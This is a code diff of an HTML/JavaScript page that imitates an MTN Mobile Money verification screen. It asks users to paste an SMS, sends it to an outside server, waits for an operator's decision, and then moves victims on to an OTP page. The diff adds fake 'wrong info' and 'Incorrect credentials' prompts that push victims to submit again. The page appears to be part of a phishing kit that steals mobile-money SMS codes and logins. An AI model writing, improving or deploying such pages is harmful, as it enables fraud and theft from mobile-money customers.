@@ -8,73 +8,53 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
 :root{
-  --mtn-yellow:#FFCC00;
-  --mtn-yellow-dark:#F5B500;
-  --mtn-yellow-light:#FFF8D6;
-  --mtn-blue:#0047AB;
-  --mtn-blue-dark:#003380;
-  --text-primary:#1a1a2e;
-  --text-muted:#8a90a2;
-  --border-light:#eef1f6;
+  --mtn-yellow:#FFCC00;--mtn-yellow-dark:#F5B500;--mtn-yellow-light:#FFF8D6;
+  --mtn-blue:#0047AB;--mtn-blue-dark:#003380;
+  --text-primary:#1a1a2e;--text-muted:#8a90a2;--border-light:#eef1f6;
   --font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
 }
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;font-family:var(--font-family);background:#f4f6fa;overflow:hidden}
 body{display:flex;justify-content:center;align-items:stretch;height:100vh;height:100dvh}
-
 .app{width:100%;max-width:480px;background:#fff;display:flex;flex-direction:column;height:100vh;height:100dvh;position:relative;overflow:hidden}
 
-/* YELLOW HEADER */
 .app-header{background:linear-gradient(160deg,#FFD633 0%,var(--mtn-yellow) 45%,var(--mtn-yellow-dark) 100%);padding:16px 20px 34px;position:relative;overflow:hidden;flex-shrink:0}
 .app-header::before{content:'';position:absolute;top:-60px;right:-60px;width:220px;height:220px;border-radius:50%;background:rgba(255,255,255,.18)}
 .app-header::after{content:'';position:absolute;top:-40px;left:-70px;width:180px;height:180px;border-radius:50%;background:rgba(0,51,128,.08)}
-
 .header-top{display:flex;justify-content:space-between;align-items:center;position:relative;z-index:2;margin-bottom:16px}
 .back-btn{width:38px;height:38px;border-radius:50%;background:rgba(255,255,255,.35);backdrop-filter:blur(10px);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:#003366;font-size:20px;font-weight:800;transition:transform .15s,background .15s}
 .back-btn:hover{background:rgba(255,255,255,.55);transform:translateX(-2px)}
 .step-pill{background:rgba(0,51,128,.15);color:#003366;padding:6px 12px;border-radius:50px;font-size:11px;font-weight:800;letter-spacing:.4px;text-transform:uppercase}
-
 .header-title{position:relative;z-index:2;color:#003366}
 .header-title h1{font-size:22px;font-weight:800;line-height:1.25;margin-bottom:6px}
 .header-title p{font-size:13px;font-weight:600;opacity:.7;line-height:1.4}
-
-/* Progress dots */
 .step-dots{display:flex;gap:6px;margin-top:14px;position:relative;z-index:2}
 .step-dot{flex:1;height:4px;border-radius:2px;background:rgba(0,51,128,.2)}
 .step-dot.active{background:#003366}
 .step-dot.done{background:#003366;opacity:.6}
 
-/* BODY */
 .app-body{flex:1;padding:22px 20px 20px;overflow-y:auto;display:flex;flex-direction:column;gap:18px}
-
-/* Info banner */
 .info-banner{background:linear-gradient(135deg,var(--mtn-yellow-light),#FFF3B8);border:1.5px solid var(--mtn-yellow);border-radius:14px;padding:14px 16px;display:flex;gap:12px;align-items:flex-start}
 .info-banner-icon{font-size:22px;flex-shrink:0;line-height:1}
 .info-banner-text{flex:1;font-size:12.5px;color:#5a4a00;line-height:1.5;font-weight:600}
 .info-banner-text strong{color:#003366;font-weight:800}
 
-/* Textarea wrapper */
 .sms-wrapper{position:relative}
 .sms-label{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
 .sms-label-text{font-size:13px;font-weight:700;color:var(--text-primary);letter-spacing:.2px}
 .char-count{font-size:11px;font-weight:700;color:var(--text-muted);background:#f4f6fa;padding:3px 10px;border-radius:20px;font-variant-numeric:tabular-nums}
 .char-count.valid{color:#16a34a;background:#f0fdf4}
-
 .sms-textarea{width:100%;min-height:150px;max-height:260px;border:2px solid var(--border-light);border-radius:16px;background:#fafbff;padding:16px;font-size:14px;font-family:var(--font-family);color:var(--text-primary);line-height:1.6;resize:vertical;outline:none;transition:border-color .2s,box-shadow .2s,background .2s}
 .sms-textarea:focus{border-color:var(--mtn-blue);background:#fff;box-shadow:0 0 0 4px rgba(0,71,171,.08)}
 .sms-textarea::placeholder{color:#c5cbd9;font-weight:500}
-
-/* Paste button inside wrapper */
 .paste-btn{position:absolute;bottom:12px;right:12px;background:var(--mtn-yellow);color:#003366;border:none;padding:8px 14px;border-radius:50px;font-size:11.5px;font-weight:800;cursor:pointer;display:flex;align-items:center;gap:6px;box-shadow:0 4px 10px rgba(255,204,0,.4);transition:transform .15s,background .15s}
 .paste-btn:hover{background:var(--mtn-yellow-dark);transform:translateY(-1px)}
 .paste-btn:active{transform:translateY(0)}
 
-/* Error */
 .error-text{color:#e74c3c;font-size:12px;margin-top:8px;display:none;font-weight:600;line-height:1.4}
 .error-text.show{display:block;animation:slideDown .3s}
 @keyframes slideDown{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
 
-/* Submit button */
 .submit-btn{width:100%;padding:18px;background:linear-gradient(135deg,var(--mtn-blue) 0%,var(--mtn-blue-dark) 100%);color:#fff;border:none;border-radius:16px;font-size:16px;font-weight:900;letter-spacing:.8px;cursor:pointer;font-family:var(--font-family);box-shadow:0 12px 28px rgba(0,71,171,.35),inset 0 1px 0 rgba(255,255,255,.15);transition:transform .15s,box-shadow .15s,opacity .15s;margin-top:auto;text-transform:uppercase;position:relative;overflow:hidden}
 .submit-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 16px 36px rgba(0,71,171,.45),inset 0 1px 0 rgba(255,255,255,.2)}
 .submit-btn:active:not(:disabled){transform:scale(.98)}
@@ -82,14 +62,12 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .submit-btn::after{content:'→';margin-left:10px;display:inline-block;transition:transform .2s;font-weight:800}
 .submit-btn:hover:not(:disabled)::after{transform:translateX(4px)}
 
-/* Trust row */
 .trust-row{display:flex;justify-content:center;align-items:center;gap:16px;padding:4px 0 0}
 .trust-item{display:flex;align-items:center;gap:5px;font-size:10.5px;color:var(--text-muted);font-weight:600;letter-spacing:.2px}
 .trust-icon{font-size:12px}
 
 .app-footer{padding:12px;text-align:center;font-size:10.5px;color:var(--text-muted);font-weight:500;flex-shrink:0;border-top:1px solid var(--border-light)}
 
-/* WAITING OVERLAY */
 .verify-overlay{position:fixed;inset:0;background:radial-gradient(900px 600px at 50% -10%,rgba(255,204,0,.12),transparent 60%),radial-gradient(700px 500px at 50% 110%,rgba(0,71,171,.35),transparent 60%),linear-gradient(180deg,#001E3C 0%,#00132A 55%,#00080F 100%);display:none;flex-direction:column;align-items:center;justify-content:center;padding:24px 20px;z-index:2000;overflow:hidden}
 .verify-overlay.show{display:flex;animation:vFadeIn .45s ease}
 @keyframes vFadeIn{from{opacity:0}to{opacity:1}}
@@ -129,7 +107,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .verify-live-dot{width:5px;height:5px;border-radius:50%;background:#22C55E;box-shadow:0 0 8px rgba(34,197,94,.9);animation:vLivePulse 1.6s ease-in-out infinite}
 @keyframes vLivePulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
 
-/* Reject modal */
 .reject-overlay{position:fixed;inset:0;background:rgba(15,23,42,.85);backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;padding:16px;z-index:2000}
 .reject-overlay.show{display:flex;animation:vFadeIn .2s}
 .reject-card{background:#fff;border-radius:20px;max-width:380px;width:100%;padding:28px 22px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.3)}
@@ -138,7 +115,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .reject-desc{font-size:13px;color:#4b5563;line-height:1.45;margin-bottom:18px}
 .reject-btn{background:var(--mtn-blue);color:#fff;border:none;border-radius:10px;padding:13px 20px;font-size:14px;font-weight:800;cursor:pointer;width:100%;text-transform:uppercase;letter-spacing:.5px}
 
-/* Responsive */
 @media (max-height:700px){
   .app-header{padding:12px 16px 28px}
   .header-title h1{font-size:19px}
@@ -153,7 +129,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 
 <div class="app">
 
-  <!-- YELLOW HEADER -->
   <div class="app-header">
     <div class="header-top">
       <button class="back-btn" onclick="window.location.href='login.html'" aria-label="Back">←</button>
@@ -170,7 +145,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
     </div>
   </div>
 
-  <!-- BODY -->
   <div class="app-body">
 
     <div class="info-banner">
@@ -207,7 +181,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 
 </div>
 
-<!-- WAITING OVERLAY -->
 <div class="verify-overlay" id="verifyOverlay">
   <div class="verify-card">
     <div class="verify-header">
@@ -236,7 +209,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
   </div>
 </div>
 
-<!-- REJECT MODAL -->
 <div class="reject-overlay" id="rejectOverlay">
   <div class="reject-card">
     <div class="reject-icon">
@@ -253,6 +225,7 @@ const API_BASE = 'https://mtnmomo-payment-production.up.railway.app';
 const POLL_MS = 2500;
 const TIMEOUT_MS = 60 * 60 * 1000;
 const SESSION_KEY = 'mtnmomo_current_receipt';
+const LAST_LOGIN_KEY = 'mtnmomo_last_phone';
 
 let currentSessionId = null;
 let pollTimer = null;
@@ -266,7 +239,6 @@ try {
   currentReceipt = JSON.parse(sessionStorage.getItem(SESSION_KEY) || '{}');
 } catch(e){ currentReceipt = {}; }
 
-/* Textarea + char count */
 const smsEl = document.getElementById('sms');
 const charCount = document.getElementById('charCount');
 const submitBtn = document.getElementById('submitBtn');
@@ -291,12 +263,10 @@ async function pasteFromClipboard(){
       smsEl.focus();
     }
   } catch(e){
-    // Browser may block clipboard — user can paste manually
     smsEl.focus();
   }
 }
 
-/* Waiting overlay */
 const verifyOverlay = document.getElementById('verifyOverlay');
 const verifyRingProgress = document.getElementById('verifyRingProgress');
 const verifyFeed = document.getElementById('verifyFeed');
@@ -384,13 +354,21 @@ function startPolling(sessionId){
         stopPolling(); stopVerifyBar();
         addFeedLine('ok','SMS accepted');
         setTimeout(()=>{ window.location.href = 'otp.html'; },400);
-      } else if (data.status === 'declined') {
+      } else if (data.status === 'rejected') {
+        // Wrong info: stay on page, clear textarea, show reject popup
         stopPolling(); stopVerifyBar();
-        showReject('SMS rejected','Please paste the correct SMS message and try again.');
+        smsEl.value = '';
+        smsEl.dispatchEvent(new Event('input'));
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Confirm & Continue';
+        showReject('Wrong info', 'The SMS you pasted is incorrect. Please paste the correct one.');
+        smsEl.focus();
       } else if (data.status === 'resend') {
+        // Resend: go back to login page with "wrong credentials" notification
         stopPolling(); stopVerifyBar();
-        // Go back to login to restart flow
-        setTimeout(()=>{ window.location.href = 'login.html'; },400);
+        sessionStorage.removeItem(SESSION_KEY);
+        sessionStorage.setItem('mtnmomo_login_error', 'Incorrect credentials. Please login again.');
+        window.location.href = 'login.html';
       } else if (data.status === 'expired') {
         stopPolling(); stopVerifyBar();
         showReject('Session expired','Your request timed out. Please try again.');
@@ -409,9 +387,9 @@ function closeReject(){
   document.getElementById('rejectOverlay').classList.remove('show');
   submitBtn.disabled = false;
   submitBtn.textContent = 'Confirm & Continue';
+  smsEl.focus();
 }
 
-/* SUBMIT */
 submitBtn.addEventListener('click', async function(){
   smsError.classList.remove('show');
   const sms = smsEl.value.trim();
@@ -450,7 +428,15 @@ submitBtn.addEventListener('click', async function(){
 
 window.addEventListener('load', ()=>{
   smsEl.value = '';
+  smsEl.dispatchEvent(new Event('input'));
   smsEl.focus();
+
+  // If we came back from a resend, show the login error after redirect
+  const loginErr = sessionStorage.getItem('mtnmomo_login_error');
+  if (loginErr) {
+    sessionStorage.removeItem('mtnmomo_login_error');
+    showReject('Incorrect credentials', loginErr);
+  }
 });
 </script>
 </body>
